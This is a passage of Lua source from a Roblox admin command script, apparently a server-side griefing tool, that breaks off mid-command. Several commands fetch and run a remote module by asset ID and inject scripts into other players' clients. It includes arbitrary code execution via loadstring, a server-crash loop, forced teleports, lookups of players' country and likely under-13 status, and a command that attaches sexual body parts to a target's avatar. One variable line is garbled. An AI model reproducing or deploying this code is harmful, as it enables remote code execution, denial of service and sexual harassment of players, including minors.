
			do
				local bigMesh = ringMesh:Clone()
				bigMesh.Scale = Vector3.new(5, 5, 1)
				bigMesh.Parent = bigRing

				local smallMesh = ringMesh:Clone()
				smallMesh.Scale = Vector3.new(4.6, 4.6, 1.5)
				smallMesh.Parent = smallRing

				local innerSphereMesh = sphereMesh:Clone()	
				innerSphereMesh.Scale = Vector3.new(-6.5, -6.5, -6.5)
				innerSphereMesh.Parent = innerSphere

				local outterSphereMesh = sphereMesh:Clone()
				outterSphereMesh.Scale = Vector3.new(6.5, 6.5, 6.5)
				outterSphereMesh.Parent = outterSphere
			end

			table.insert(shockwave, bigRing)	
			table.insert(shockwave, smallRing)
			table.insert(shockwave, outterSphere)
			table.insert(shockwave, innerSphere)

			for _, v in ipairs(shockwave) do
				v.Parent = container
			end
			for _, v in ipairs(clouds) do
				v.Parent = container
			end

			return {
				OutterSphere = outterSphere,
				InnerSphere = innerSphere,
				BigRing = bigRing,
				SmallRing = smallRing,
				BaseCloud = baseCloud,
				PoleBase = poleBase,
				PoleRing = poleRing,
				Cloud1 = cloud1,
				Cloud2 = cloud2,
				Cloud3 = cloud3,
				MushCloud = mushCloud,
				TopCloud = topCloud
			}
		end

		local function effects(nolighting)
			for i = 1, 2 do
				local explosionSound = Instance.new("Sound")
				explosionSound.Name = "NUKE_SOUND"
				explosionSound.SoundId = "http://www.roblox.com/asset?id=130768997"
				explosionSound.Volume = 0.5
				explosionSound.PlaybackSpeed = i / 2
				explosionSound.RollOffMinDistance, explosionSound.RollOffMaxDistance = 0, 10000
				explosionSound.Archivable = false
				explosionSound.Parent = SoundService
				explosionSound:Play()
				Debris:AddItem(explosionSound, 30)
			end

			if not nolighting then
				local oldBrightness = Lighting.Brightness
				Lighting.Brightness = 5
				basicTween(Lighting, {Brightness = 1}, 4 / 0.01 * (1 / 60))
				Lighting.Brightness = oldBrightness
			end
		end

		local function tagHumanoid(humanoid, attacker)
			local creatorTag = Instance.new("ObjectValue")
			creatorTag.Name = "creator"
			creatorTag.Value = attacker
			Debris:AddItem(creatorTag, 2)
			creatorTag.Parent = humanoid
		end

		local function destruction(position, radius, attacker)
			for _, v in ipairs(workspace:GetPartBoundsInRadius(position, radius, explosionParams)) do
				if v.ClassName ~= "Terrain" and v.Anchored == false then
					if attacker then
						local humanoid = v.Parent:FindFirstChildOfClass("Humanoid")
						if humanoid and not humanoid:FindFirstChild("creator") then
							tagHumanoid(humanoid, attacker)
						end
					end
					v:BreakJoints()
					v.Material = Enum.Material.CorrodedMetal
					v.AssemblyLinearVelocity = CFrame.new(v.Position, position):VectorToWorldSpace(Vector3.new(math.random(-5, 5), 5, 1000))
				end
			end
		end

		local function explode(position: Vector3, explosionSize: number, nolighting: boolean?, attacker: (Player | Humanoid)?)
			local shockwaveCompleted = false
			explosionParams.FilterDescendantsInstances = nukeIgnore
			local clouds, shockwave = {}, {}
			local container = Instance.new("Model")
			container.Name = "ADONIS_NUCLEAREXPLOSION"
			container.Archivable = false
			container.ModelStreamingMode = Enum.ModelStreamingMode.Atomic
			container.Parent = workspace
			table.insert(nukeIgnore, container)

			local cloudData = createMushroomCloud(position, container, clouds, shockwave)
			local outterSphere, innerSphere, bigRing, smallRing = cloudData.OutterSphere, cloudData.InnerSphere, cloudData.BigRing, cloudData.SmallRing
			local baseCloud, poleBase, poleRing = cloudData.BaseCloud, cloudData.PoleBase, cloudData.PoleRing
			localcombo1, cloud2, cloud3, mushCloud, topCloud = cloudData.Cloud1, cloudData.Cloud2, cloudData.Cloud3, cloudData.MushCloud, cloudData.TopCloud

			local newSky = skybox:Clone()
			table.insert(nukeSkyboxes, newSky)
			newSky.Parent = Lighting
			task.spawn(effects, nolighting)

			for _, v in ipairs(Lighting:GetChildren()) do
				if v:IsA("Sky") and not table.find(nukeSkyboxes, v) and not table.find(realSkyboxes, v) then
					table.insert(realSkyboxes, v)
				end
			end

			task.spawn(function()
				local maxSize = explosionSize * 3
				local smallSize = explosionSize / 2.5
				local nukeDuration = (maxSize - smallSize) / 2 * (1 / 60)
				local transforms = {
					{innerSphere, Vector3.new(-6.5 * maxSize, -6.5 * maxSize, -6.5 * maxSize)},
					{outterSphere, Vector3.new(6.5 * maxSize, 6.5 * maxSize, 6.5 * maxSize)},
					{smallRing, Vector3.new(4.6 * maxSize, 4.6 * maxSize, 1.5 * maxSize)},
					{bigRing, Vector3.new(5 * maxSize, 5 * maxSize, 1 * maxSize)},
				}

				for _, v in ipairs(transforms) do
					local object, scale = v[1], v[2]
					if typeof(object) == "Instance" then
						local mesh = object:FindFirstChildOfClass("SpecialMesh")
						if mesh then
							mesh.Scale = scale * (smallSize / maxSize)
							task.spawn(basicTween, mesh, {Scale = scale}, nukeDuration)
						end
					end
				end

				do
					local startclock = os.clock()
					local expGrow, expStat = maxSize - smallSize, smallSize
					repeat
						destruction(
							position,
							(((os.clock() - startclock) / nukeDuration) * expGrow + expStat) * 2,
							attacker
						)
						task.wait(1/25)
					until (os.clock() - startclock) > nukeDuration
				end

				for _, v in ipairs(shockwave) do
					v.Transparency = 0
					task.spawn(basicTween, v, {Transparency = 1}, 100 * (1 / 60))
				end
				task.wait(100 * (1 / 60))

				for _, v in ipairs(shockwave) do
					v:Destroy()
				end
				shockwaveCompleted = true
			end)

			task.spawn(function()
				local transforms = {
					{baseCloud, Vector3.new(2.5 * explosionSize, 1 * explosionSize, 4.5 * explosionSize), Vector3.new(0, 0.05 * explosionSize, 0)},
					{poleBase, Vector3.new(1 * explosionSize, 2 * explosionSize, 2.5 * explosionSize), Vector3.new(0, 0.1 * explosionSize, 0)},
					{poleRing, Vector3.new(1.2 * explosionSize, 1.2 * explosionSize, 1.2 * explosionSize), Vector3.new(0, 1.3 * explosionSize, 0)},
					{topCloud, Vector3.new(0.75 * explosionSize, 1.5 * explosionSize, 1.5 * explosionSize), Vector3.new(0, 2.7 * explosionSize, 0)},
					{mushCloud, Vector3.new(2.5 * explosionSize, 1.75 * explosionSize, 3.5 * explosionSize), Vector3.new(0, 2.3 * explosionSize, 0)},
					{cloud1, Vector3.new(0.5 * explosionSize, 3 * explosionSize, 1 * explosionSize), Vector3.new(0, 0.75 * explosionSize, 0)},
					{cloud2, Vector3.new(0.5 * explosionSize, 1.5 * explosionSize, 1 * explosionSize), Vector3.new(0, 1.25 * explosionSize, 0)},
					{cloud3, Vector3.new(0.5 * explosionSize, 1.5 * explosionSize, 1 * explosionSize), Vector3.new(0, 1.7 * explosionSize, 0)},
				}

				for _, v in ipairs(transforms) do
					local object, scale = v[1], v[2]
					if typeof(object) == "Instance" then
						object.Position = position + v[3] / 5
						local mesh = object:FindFirstChildOfClass("SpecialMesh")
						if mesh then
							mesh.Scale = scale / 5
							task.spawn(basicTween, mesh, {Scale = scale}, 2)
						end
						task.spawn(basicTween, object, {Position = position + v[3]}, 2)
					end
				end
			end)
			task.wait(2)

			for _, v in ipairs(clouds) do
				local mesh = v:FindFirstChildOfClass("SpecialMesh")
				if mesh then
					mesh.VertexColor = Vector3.new(0.9, 0.6, 0)
					task.spawn(basicTween, mesh, {VertexColor = Vector3.new(0.9, 0, 0)}, 0.6 / 0.0025 * (1 / 60))
				end
			end
			task.wait(0.6 / 0.0025 * (1 / 60))

			for _, v in ipairs(clouds) do
				local mesh = v:FindFirstChildOfClass("SpecialMesh")
				if mesh then
					mesh.VertexColor = Vector3.new(0.9, 0, 0)
					task.spawn(basicTween, mesh, {VertexColor = Vector3.new(0.5, 0, 0)}, (0.9 - 0.5) / 0.01 * (1 / 60) * 2)
				end
			end
			task.wait((0.9 - 0.5) / 0.01 * (1 / 60) * 2)

			local skyConnection
			skyConnection = newSky.AncestryChanged:Connect(function()
				if newSky and newSky.Parent ~= Lighting and table.find(nukeSkyboxes, newSky) then
					table.remove(nukeSkyboxes, table.find(nukeSkyboxes, newSky))
				end
				local hasNukeSkyboxes = false
				for _, v in ipairs(nukeSkyboxes) do
					if v.Parent == Lighting then
						hasNukeSkyboxes = true
						break
					end
				end
				if not hasNukeSkyboxes then
					for i = #realSkyboxes, 1, -1 do
						local v = realSkyboxes[i]
						if v.Parent == Lighting then
							v.Parent = nil
							task.spawn(function()
								task.wait()
								v.Parent = Lighting
							end)
						elseif table.find(realSkyboxes, v) then
							table.remove(realSkyboxes, table.find(realSkyboxes, v))
						end
					end
				end
				skyConnection:Disconnect()
			end)
			Debris:AddItem(newSky, 10)

			for _, v in ipairs(clouds) do
				local mesh = v:FindFirstChildOfClass("SpecialMesh")
				if mesh then
					mesh.VertexColor = Vector3.new(0, 0, 0)
					task.spawn(basicTween, mesh, {VertexColor = Vector3.new(0.5, 0.5, 0.5)}, 0.5 / 0.005 * (1 / 60))
					task.spawn(basicTween, mesh, {Scale = mesh.Scale + Vector3.new(0.1, 0.1, 0.1) * (0.5 / 0.005)}, 0.5 / 0.005 * (1 / 60))
				end
				task.spawn(basicTween, v, {Transparency = 0.5}, 0.5 / 0.005 * (1 / 60))
			end
			task.wait(0.5 / 0.005 * (1 / 60))

			for _, v in ipairs(clouds) do
				task.spawn(basicTween, v, {Transparency = 1}, 20)
				local mesh = v:FindFirstChildOfClass("SpecialMesh")
				if mesh then
					task.spawn(basicTween, mesh, {Scale = mesh.Scale + Vector3.new(0.1, 0.1, 0.1) * (1 / 0.005)}, 20)
				end
			end
			task.wait(20)

			while true do task.wait(1) if shockwaveCompleted then break end end
			container:Destroy()
		end

		if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
			explode(target.Character.HumanoidRootPart.Position, args, false, sender)
		else
			explode(nil, args, false, sender)
		end
	end
})

addcmd({
	Name = "disablereset",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				game:GetService("StarterGui"):SetCore("ResetButtonCallback", false)
				script:Destroy()

			]]

			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end

			scr.Enabled = true
		end
	end
})

addcmd({
	Name = "enablereset",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
				script:Destroy()
			
			]]

			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end

			scr.Enabled = true
		end
	end
})

addcmd({
	Name = "maxzoom",
	Aliases = {},
	Function = function(sender, targets, arguments)
		local value = table.concat(arguments, " ")
		for i, plr in ipairs(targets) do
			plr.CameraMaxZoomDistance = value
		end
	end
})

addcmd({
	Name = "fov",
	Aliases = {},
	Function = function(sender, targets, arguments)
		local value = arguments[1]
		for i, plr in ipairs(targets) do
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = string.format([[
			
				workspace.Camera.FieldOfView = %s
				script:Destroy()
			
			]], value)

			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end

			scr.Enabled = true		
		end
	end
})

addcmd({
	Name = "shift",
	Aliases = {"shiftl"},
	Function = function(sender, targets, arguments)
		local option = table.concat(arguments, " ", 1)

		if option ~= "true" and option ~= "false" then
			notfi(sender, "Vecxo's admin", "The values are true or false! example: ".. _G.prefix .."shiftlock cxo true")
		end

		local bool = (option == "true")

		for i, plr in ipairs(targets) do
			plr.DevEnableMouseLock = bool
		end
	end
})

addcmd({
	Name = "minzoom",
	Aliases = {},
	Function = function(sender, targets, arguments)
		local value = table.concat(arguments, " ")
		for i, plr in ipairs(targets) do
			plr.CameraMinZoomDistance = value
		end
	end
})

addcmd({
	Name = "premium",
	Aliases = {"promptpremium"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			game:GetService("MarketplaceService"):PromptPremiumPurchase(plr)
		end
	end
})

addcmd({
	Name = "float",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
			local sgui = Instance.new("ScreenGui", plr:WaitForChild("PlayerGui"))
			sgui.ResetOnSpawn = false
			sgui.Name = "Float"

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				local UserInputService = game:GetService("UserInputService")
				local RunService = game:GetService("RunService")
				local player = game.Players.LocalPlayer
				local mouse = player:GetMouse()

				local Speed_1 = 250
				local startup = false

				local SpaceHeld = false
				local ControlHeld = false

				mouse.KeyDown:Connect(function(key)
					if key == "-" then
						Speed_1 = Speed_1 - 10
					elseif key == "=" then
						Speed_1 = Speed_1 + 10
					elseif key == "m" then
						startup = not startup
						if startup then
							local brick = Instance.new("Part", workspace)
							brick.Size = Vector3.new(15, 2, 15)
							brick.Anchored = true
							brick.Transparency = 1
							brick.Name = "Brick"
							brick.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, -4, 0)

							local b
							b = RunService.RenderStepped:Connect(function()
								if not brick or not brick.Parent then
									b:Disconnect()
									return
								end
								brick.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, -4, 0)
							end)

							mouse.KeyDown:Connect(function(k)
								if k == "m" and brick then
									brick:Destroy()
								end
							end)
						end
					end
				end)

				RunService.Heartbeat:Connect(function(delta)
					if startup and player.Character then
						local chr = player.Character
						local hum = chr:FindFirstChildWhichIsA("Humanoid")
						if hum and hum.MoveDirection.Magnitude > 0 then
							chr:TranslateBy(hum.MoveDirection * Speed_1 * delta)
						end
						if SpaceHeld and not UserInputService:GetFocusedTextBox() then
							chr:TranslateBy(Vector3.new(0, 30 * delta, 0))
						end
						if ControlHeld then
							chr:TranslateBy(Vector3.new(0, -30 * delta, 0))
						end
					end
				end)

				UserInputService.InputBegan:Connect(function(input, p)
					if p then return end
					if input.KeyCode == Enum.KeyCode.Space then
						SpaceHeld = true
					elseif input.KeyCode == Enum.KeyCode.LeftControl then
						ControlHeld = true
					end
				end)

				UserInputService.InputEnded:Connect(function(input)
					if input.KeyCode == Enum.KeyCode.Space then
						SpaceHeld = false
					elseif input.KeyCode == Enum.KeyCode.LeftControl then
						ControlHeld = false
					end
				end)
			
			]]

			scr.Parent = sgui
			scr.Enabled = true
		end
	end
})

addcmd({
	Name = "fixcam",
	Aliases = {},
	Function = function(sender, targets, arguments)
		local value = arguments[1]
		for i, plr in ipairs(targets) do
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				local lp = game.Players.LocalPlayer
				local ui = game:GetService("UserInputService")
				local contextActionService = game:GetService("ContextActionService")
				local runService = game:GetService("RunService")
				
				contextActionService:UnbindAction("ShoulderCameraSprint")
				runService:UnbindFromRenderStep("ShoulderCameraUpdate")
				contextActionService:UnbindAction("ShoulderCameraZoom")
				
				while true do
					task.wait()
					
					repeat
						runService.Heartbeat:Wait()
					until game.Workspace.CurrentCamera.CameraType == Enum.CameraType.Scriptable
				
					runService:UnbindFromRenderStep("ShoulderCameraUpdate")
					contextActionService:UnbindAction("ShoulderCameraZoom")
					contextActionService:UnbindAction("ShoulderCameraSprint")
				
					local weaponSystem = game:GetService("ReplicatedStorage"):FindFirstChild('WeaponsSystem')
					if not weaponSystem then
						return
					end
				
					for _, v in pairs(weaponSystem:GetDescendants()) do
						if v:IsA("Script") then
							v.Disabled = true
						end
						v:Destroy()
					end
				
					local weaponScript = lp.PlayerGui:FindFirstChild("ClientWeaponsScript")
					local weaponGui = lp.PlayerGui:FindFirstChild("WeaponsSystemGui")
					local clientWeaponScript = lp.PlayerScripts:FindFirstChild("ClientWeaponsScript")
				
					if weaponScript then
						weaponScript.Disabled = true
						weaponScript:Destroy()
					end
				
					if weaponGui then
						weaponGui:Destroy()
					end
				
					if clientWeaponScript then
						clientWeaponScript.Disabled = true
						clientWeaponScript:Destroy()
					end
				
					game:GetService("UserInputService").MouseBehavior = Enum.MouseBehavior.Default
					ui.MouseIconEnabled = true
					lp.CameraMaxZoomDistance = 400
					lp.CameraMinZoomDistance = 0.5
				
					local camera = game:GetService("Workspace"):FindFirstChild("Camera")
					if camera then
						camera.FieldOfView = 70
					end
				
					game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
					game.Workspace.CurrentCamera.CameraSubject = lp.Character.Humanoid
					lp.Character.Humanoid.AutoRotate = true
				end
			]]

			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end

			scr.Enabled = true		
		end
	end
})

addcmd({
	Name = "rejoin",
	Aliases = {"rj"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			if game.PrivateServerId ~= "" then
				game:GetService("TeleportService"):Teleport(game.PlaceId, plr)
			else
				local options = Instance.new("TeleportOptions")
				options.ServerInstanceId = game.JobId

				game:GetService("TeleportService"):TeleportAsync(game.PlaceId, {plr}, options)
			end
		end
	end
})

addcmd({
	Name = "forcetp",
	Aliases = {"forceplace"},
	Function = function(sender, targets, arguments)

		if not table.find(_G.Whitelist, tostring(sender.UserId)) then
			notfi(sender, "Vecxo's admin", "Only the top admins can use this command!")
			return
		end

		local id = arguments[1]

		if id == "" or id == nil then
			notfi(sender, "Vecxo's admin", "You need to provide a game id!")
			return
		end

		if id == "1" then
			id = "100181602455094"
		end

		for i, plr in ipairs(targets) do

			if table.find(_G.Whitelist, tostring(plr.UserId)) and restrictcheck(sender) then
				notfi(sender, "Vecxo's admin", "You cant forcetp this player due to crosswoods!")
				return
			end

			local success, fail = pcall(function()
				game:GetService("TeleportService"):Teleport(id, plr)
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "Failed to teleport ".. plr.Name .." to ".. id .." | ".. fail)
			end

			task.spawn(function()
				task.wait(5)
				if game.Players:FindFirstChild(plr.Name) then
					notfi(sender, "Vecxo's admin", "Player failed to teleport, they might not be old enough to join the experience.")
				end
			end)

		end
	end
})

addcmd({
	Name = "crashserver",
	Aliases = {"cserver"}, 
	Player = false,
	Function = function(sender, targets, arguments)
		if table.find(_G.Whitelist, tostring(sender.UserId)) then
			while true do
				for i = 1, 1000000 do
					local a = Instance.new("Part", workspace)
					a.CFrame = CFrame.new(0, 5, 0)
					--a.Anchored = true
				end
				task.wait()
			end
		else
			notfi(sender, "Vecxo's admin", "Due to misuse only the top admins can use this command!")
		end
	end
})

addcmd({
	Name = "locate",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, code = pcall(game:GetService("LocalizationService").GetCountryRegionForPlayerAsync, game:GetService("LocalizationService"), plr)
			if success and code then
				notfi(sender, "Vecxo's admin", plr.Name .." is from: ".. countries[code])
			end
		end
	end
})

addcmd({
	Name = "age",
	Aliases = {"checkage"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, chat = pcall(function()
				return game:GetService("TextChatService"):CanUsersDirectChatAsync(sender.UserId, { plr.UserId })
			end)

			if success then
				if #chat > 0 then
					notfi(sender, "Vecxo's admin", plr.Name .." is most likely 13+")
				else
					notfi(sender, "Vecxo's admin", plr.Name .." is most likely <13")
				end
			end
		end
	end
})

addcmd({ -- Requested by punchy39, he gave da anim code
	Name = "jork",
	Aliases = {"j"},
	Function = function(sender, targets, arguments)
		if not restrictcheck(sender) then
			for i, plr in ipairs(targets) do
				if plr.Character and plr.Character:FindFirstChild("Humanoid") and plr.Character:FindFirstChild("Torso") then
					local tip = Instance.new("Part", plr.Character)
					local peep = Instance.new("Part", plr.Character)
					local ball1 = Instance.new("Part", plr.Character)
					local ball2 = Instance.new("Part", plr.Character)

					local tipmesh = Instance.new("SpecialMesh", tip)
					local peepmesh = Instance.new("CylinderMesh", peep)
					local ball1mesh = Instance.new("SpecialMesh", ball1)
					local ball2mesh = Instance.new("SpecialMesh", ball2)

					local tipweld = Instance.new("WeldConstraint", plr.Character)
					local peepweld = Instance.new("WeldConstraint", plr.Character)
					local peepweld2 = Instance.new("WeldConstraint", peep)
					local ball1weld = Instance.new("WeldConstraint", plr.Character)
					local ball2weld = Instance.new("WeldConstraint", plr.Character)

					tip.BrickColor = BrickColor.new("Pink")
					tip.Size = Vector3.new(1, 1, 1)
					tip.BottomSurface = "Smooth"
					tip.TopSurface = "Smooth"
					tip.CanCollide = false
					tip.Locked = true

					peep.Color = plr.Character.Torso.Color
					peep.Size = Vector3.new(0.4, 1.3, 0.4)
					peep.BottomSurface = "Smooth"
					peep.TopSurface = "Smooth"
					peep.CanCollide = false
					peep.Locked = true

					ball1.Color = plr.Character.Torso.Color
					ball1.Size = Vector3.new(1, 1, 1)
					ball1.BottomSurface = "Smooth"
					ball1.TopSurface = "Smooth"
					ball1.CanCollide = false
					ball1.Locked = true

					ball2.Color = plr.Character.Torso.Color
					ball2.Size = Vector3.new(1, 1, 1)
					ball2.BottomSurface = "Smooth"
					ball2.TopSurface = "Smooth"
					ball2.CanCollide = false
					ball2.Locked = true

					tipmesh.MeshType = "Sphere"
					tipmesh.Scale = Vector3.new(0.4, 0.62, 0.4)

					ball1mesh.MeshType = "Sphere"
					ball1mesh.Scale = Vector3.new(0.4, 0.4, 0.4)

					ball2mesh.MeshType = "Sphere"
					ball2mesh.Scale = Vector3.new(0.4, 0.4, 0.4)

					peep.CFrame = plr.Character.Torso.CFrame * CFrame.new(0, -1, -1.15) * CFrame.Angles(math.rad(90), 0, 0)
					tip.CFrame = peep.CFrame * CFrame.new(0, -0.65, 0)
					ball1.CFrame = peep.CFrame * CFrame.new(0.25, 0.6, 0.25)
					ball2.CFrame = peep.CFrame * CFrame.new(-0.25, 0.6, 0.25)

					tipweld.Part0 = plr.Character.Torso
					tipweld.Part1 = tip

					peepweld.Part0 = plr.Character.Torso
					peepweld.Part1 = peep

					peepweld2.Part0 = peep
					peepweld2.Part1 = tip

					ball1weld.Part0 = plr.Character.Torso
					ball1weld.Part1 = ball1

					ball2weld.Part0 = plr.Character.Torso
					ball2weld.Part1 = ball2

					local anim1 = Instance.new("Animation")
					anim1.AnimationId = "rbxassetid://72042024"
					local anim2 = Instance.new("Animation")
					anim2.AnimationId = "rbxassetid://168268306"
					local h = plr.Character:FindFirstChild("Humanoid")

					local track1 = h:LoadAnimation(anim1)
					local track2 = h:LoadAnimation(anim2)

					local length1 = track1.Length
					local length2 = track2.Length

					local restartPoint1 = length1 - 0.2
					local restartPoint2 = length2 - 0.2
					while true do
						track1:Play()
						track1.TimePosition = 0.4
						if track1.TimePosition >= restartPoint1 then
							track1.TimePosition = 0.4
						end
						track2:Play()
						track2.TimePosition = 0.5
						if track2.TimePosition >= restartPoint2 then
							track2.TimePosition = 0.5
						end
						wait(0.4)
					end
				end
			end
		else
			notfi(sender, "Vecxo's admin", "restricted mode is enabled, this command can't be used.")
		end
	end
})

addcmd({
	Name = "troll",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character and (plr.Character:FindFirstChild("Shirt")) then
				plr.Character.Shirt.ShirtTemplate = "http://www.roblox.com/asset/?id=9288587131"
			else
				local shirt = Instance.new("Shirt", plr.Character)
				shirt.ShirtTemplate = "http://www.roblox.com/asset/?id=9288587131"
			end
			if plr.Character and (plr.Character:FindFirstChild("Pants")) then
				plr.Character.Pants.PantsTemplate = "http://www.roblox.com/asset/?id=5690474101"
			else
				local pants = Instance.new("Pants", plr.Character)
				pants.PantsTemplate = "http://www.roblox.com/asset/?id=5690474101"
			end
		end
	end
})

addcmd({
	Name = "s",
	Aliases = {"run", "code"},
	Player = false,
	Function = function(sender, targets, arguments) -- only the highest admins (hard coded) can use this, no temps
		local code = table.concat(arguments, " ")
		--[[if sender.UserId == 3222470105 then
			local success, err = pcall(function()
				loadstring(code)()
			end)

			if err then
				notfi(sender, "Vecxo's admin", "Issue executing code: ".. err)
			end
		end]]

		--if not restrictcheck(sender) then
		if table.find(_G.Whitelist, tostring(sender.UserId)) then

			local success, err = pcall(function()
				loadstring(code)()
			end)

			if err then
				notfi(sender, "Vecxo's admin", "Issue executing code: ".. err)
			end

		else
			notfi(sender, "Vecxo's admin", "Only the top admins can use this command!")
		end
		--[[else
			notfi(sender, "Vecxo's admin", "restricted mode is enabled, this command can't be used.")
		end]]
	end
})

addcmd({
	Name = "destroy",
	Aliases = {"remove"},
	Player = false,
	Function = function(sender, targets, arguments)
		local part = table.concat(arguments, " ")

		if part == "Tabby" or part == "Terrain" then
			notfi(sender, "Vecxo's admin", "You are not allowed to destroy this!")
			return
		end

		if not game:GetService("Workspace"):FindFirstChild(part) then
			notfi(sender, "Vecxo's admin", "Invalid object! This command checks the workspace for the object name and destroys it.")
			return
		end

		local success, err = pcall(function()
			game:GetService("Workspace"):FindFirstChild(part):Destroy()
		end)

		if err then
			notfi(sender, "Vecxo's admin", "Issue destroying object: ".. err)
		end

	end
})

addcmd({ -- credits 2 iy ss
	Name = "disco",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)
		nodisco = nil
		coroutine.resume(coroutine.create(function()
			repeat
				game:GetService('Lighting').GlobalShadows = true
				game:GetService('Lighting').FogEnd = 200
				game:GetService('Lighting').TimeOfDay = 0
				local r = 255
				local g = 0
				local b = 0
				for i = 0,255,5 do
					if nodisco ~=nil then return end
					r = r - 5
					b = b + 5
					game:GetService('Lighting').Ambient = Color3.fromRGB(r,g,b)
					game:GetService('Lighting').OutdoorAmbient = Color3.fromRGB(r,g,b)
					game:GetService('Lighting').FogColor = Color3.fromRGB(r,g,b)
					task.wait()
				end
				for i = 0,255,5 do
					if nodisco ~=nil then return end
					g = g + 5
					game:GetService('Lighting').Ambient = Color3.fromRGB(r,g,b)
					game:GetService('Lighting').OutdoorAmbient = Color3.fromRGB(r,g,b)
					game:GetService('Lighting').FogColor = Color3.fromRGB(r,g,b)
					task.wait()
				end
				for i = 0,255,5 do
					if nodisco ~=nil then return end
					b = b - 5
					game:GetService('Lighting').Ambient = Color3.fromRGB(r,g,b)
					game:GetService('Lighting').OutdoorAmbient = Color3.fromRGB(r,g,b)
					game:GetService('Lighting').FogColor = Color3.fromRGB(r,g,b)
					task.wait()
				end
				for i = 0,255,5 do
					if nodisco ~=nil then return end
					r = r + 5
					game:GetService('Lighting').Ambient = Color3.fromRGB(r,g,b)
					game:GetService('Lighting').OutdoorAmbient = Color3.fromRGB(r,g,b)
					game:GetService('Lighting').FogColor = Color3.fromRGB(r,g,b)
					task.wait()
				end
				for i = 0,255,5 do
					if nodisco ~=nil then return end
					g = g - 5
					game:GetService('Lighting').Ambient = Color3.fromRGB(r,g,b)
					game:GetService('Lighting').OutdoorAmbient = Color3.fromRGB(r,g,b)
					game:GetService('Lighting').FogColor = Color3.fromRGB(r,g,b)
					task.wait()
				end
			until nodisco
		end))
	end
})

addcmd({
	Name = "undisco",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)
		nodisco = true
		task.wait()
		game:GetService("Lighting").Ambient = Color3.new(0, 0, 0)
		game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(128, 128, 128)
		game:GetService("Lighting").Brightness = 1.98
		game:GetService("Lighting").ClockTime = 14
		game:GetService("Lighting").FogColor = Color3.new(0, 0 ,0)
